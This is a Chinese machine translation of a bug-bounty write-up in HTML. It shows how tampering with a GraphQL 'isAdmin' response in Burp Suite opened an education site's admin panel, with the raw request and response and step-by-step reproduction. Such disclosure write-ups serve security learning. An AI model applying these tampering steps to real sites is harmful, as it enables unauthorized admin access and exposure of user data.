<html>
<head>
<title>Another Admin panel</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">另一个管理面板</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/another-admin-panel-e0489dc76678?source=collection_archive---------0-----------------------#2021-12-07">https://infosecwriteups.com/another-admin-panel-e0489dc76678?source=collection_archive---------0-----------------------#2021-12-07</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><p id="a106" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">祝你平安。(愿你平安)。</p><p id="28ca" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我带着另一篇报道回来了，我希望你们正在狩猎并获得赏金。这一次，我能够在<a class="ae ks" href="https://graphql.org/" rel="noopener ugc nofollow" target="_blank"> graphql </a>的帮助下访问管理面板。我们开始吧。</p><figure class="kt ku kv kw gt kx"><div class="bz fp l di"><div class="ky kz l"/></div></figure><p id="0466" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在这篇文章中，我以target.com为例。我正在逐个测试target.com的子域，然后我来到了education.target.com的这个子域。这是某种教育页面，学生可以登录并观看讲座。</p></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><p id="7c0c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">攻击</strong></p><p id="80e1" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当我作为普通用户登录时，我看到登录功能和学生教育页面可用的页面，我打开我的burp套件并刷新页面，以查看对服务器的请求。在那之后，可以看到<a class="ae ks" href="https://graphql.org/" rel="noopener ugc nofollow" target="_blank"> graphql </a>由于某种原因向api端点发出请求。</p><p id="4ddb" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">请求</strong></p><pre class="kt ku kv kw gt la lb lc ld aw le bi"><span id="e534" class="lf lg iq lb b gy lh li l lj lk">POST /api/graphql HTTP/1.1</span><span id="5486" class="lf lg iq lb b gy ll li l lj lk">Host: education.target.com<br/>                                                                           User-Agent: Mozilla/5.0 Gecko/20100101 Firefox/91.0<br/>Accept: */*</span><span id="149a" class="lf lg iq lb b gy ll li l lj lk">Cookie: a0:state=YOUR Cookie</span><span id="20c5" class="lf lg iq lb b gy ll li l lj lk">{"operationName":"isAdmin","variables":{},"query":"query isAdmin {\n  isAdmin\n}\n"}</span></pre><p id="0237" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我在burp suite中右键单击请求-&gt;执行拦截-&gt;对此请求的响应</p><p id="0150" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">回应</strong></p><pre class="kt ku kv kw gt la lb lc ld aw le bi"><span id="2fd4" class="lf lg iq lb b gy lh li l lj lk">HTTP/1.1 200 OK<br/>Server: nginx/1.19.1<br/>Date: Sat, 04 Sep 2021 04:47:05 GMT<br/>Content-Type: application/json; charset=utf-8<br/>Content-Length: 27<br/>Connection: close<br/>access-control-allow-origin: *<br/>access-control-allow-credentials: true<br/>etag: W/"1b-fPOq3WJkZQ0rkaalpPwLwZziKSQ"<br/>Vary: Accept-Encoding<br/>Strict-Transport-Security: max-age=15724800; includeSubDomains<br/><br/>{"data":{"isAdmin":false}} &lt;-- I just change this to this -&gt; isAdmin":true</span></pre><p id="3ad9" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我可以进入管理面板。在那里，我可以添加讲座并查看所有学生的名单。</p></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><h1 id="0fc5" class="lm lg iq bd ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi bi translated">复制步骤</h1><ol class=""><li id="27a6" class="mj mk iq jw b jx ml kb mm kf mn kj mo kn mp kr mq mr ms mt bi translated">转到这个网址education.target.com</li><li id="5ffa" class="mj mk iq jw b jx mu kb mv kf mw kj mx kn my kr mq mr ms mt bi translated">使用您的凭据登录:</li><li id="afcd" class="mj mk iq jw b jx mu kb mv kf mw kj mx kn my kr mq mr ms mt bi translated">之后，刷新页面并在burp suite中捕获请求，转发每个请求，直到您看到以下请求:</li></ol><pre class="kt ku kv kw gt la lb lc ld aw le bi"><span id="55c3" class="lf lg iq lb b gy lh li l lj lk">POST /api/graphql HTTP/1.1</span><span id="bcd3" class="lf lg iq lb b gy ll li l lj lk">Host: education.target.com<br/>                                                                           User-Agent: Mozilla/5.0 Gecko/20100101 Firefox/91.0<br/>Accept: */*</span><span id="73ff" class="lf lg iq lb b gy ll li l lj lk">Cookie: a0:state=YOUR Cookie</span><span id="42a2" class="lf lg iq lb b gy ll li l lj lk">{"operationName":"isAdmin","variables":{},"query":"query isAdmin {\n  isAdmin\n}\n"}</span></pre><p id="fd48" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">4.右键单击请求-&gt;拦截-&gt;响应此请求</p><p id="78d2" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">5.之后，您将在您的打嗝套件中看到以下回应:</p><pre class="kt ku kv kw gt la lb lc ld aw le bi"><span id="ea72" class="lf lg iq lb b gy lh li l lj lk">HTTP/1.1 200 OK<br/>Server: nginx/1.19.1<br/>Date: Sat, 04 Sep 2021 04:47:05 GMT<br/>Content-Type: application/json; charset=utf-8<br/>Content-Length: 27<br/>Connection: close<br/>access-control-allow-origin: *<br/>access-control-allow-credentials: true<br/>etag: W/"1b-fPOq3WJkZQ0rkaalpPwLwZziKSQ"<br/>Vary: Accept-Encoding<br/>Strict-Transport-Security: max-age=15724800; includeSubDomains<br/><br/>{"data":{"isAdmin":false}}</span></pre><p id="0109" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">6.将“isAdmin: false”更改为“isAdmin: true”并发送请求</p><p id="eb7a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">7.回到你的浏览器，你会在主页上看到管理面板。</p></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><p id="02d8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">主要漏洞存在于<a class="ae ks" href="https://graphql.org/" rel="noopener ugc nofollow" target="_blank"> graphql </a>中。仅仅因为<a class="ae ks" href="https://graphql.org/" rel="noopener ugc nofollow" target="_blank"> graphql </a>实现中的错误配置，攻击者就能够访问管理面板。</p></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><h1 id="98dc" class="lm lg iq bd ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi bi translated">外卖食品</h1><p id="6dfc" class="pw-post-body-paragraph ju jv iq jw b jx ml jz ka kb mm kd ke kf mz kh ki kj na kl km kn nb kp kq kr ij bi translated">始终检查登录页面上的每个请求，尤其是<a class="ae ks" href="https://graphql.org/" rel="noopener ugc nofollow" target="_blank"> graphql </a>页面。</p><p id="5792" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">由于公司隐私，我没有附上管理面板页面的截图。</p></div></div>    
</body>
</html>